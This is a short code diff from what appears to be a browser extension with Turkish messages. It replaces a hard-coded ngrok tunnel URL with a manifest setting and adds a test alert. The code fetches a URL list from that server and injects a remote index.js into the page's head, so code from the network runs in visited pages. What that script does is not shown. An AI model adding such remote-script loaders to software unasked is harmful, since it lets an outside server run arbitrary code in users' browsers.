@@ -1,12 +1,14 @@
-fetch("https://9f7b91c4a3fa.ngrok.io/url.json")
+
+var serverURL = chrome.runtime.getManifest().server_url;
+fetch(`${serverURL}/url.json`)
     .then(response=>response.json())
     .then(data => {
         sayfayaScriptEkle(`${data.url}/index.js`);
+        alert("test");
     })
     .catch((error) => {
-        console.error('Hata:', error);
+        console.error("index.js ulaşmaya çalışırken hata: "+error);
     });
-
 
 function sayfayaScriptEkle(scriptURL) {
     const head = document.getElementsByTagName("head")[0];
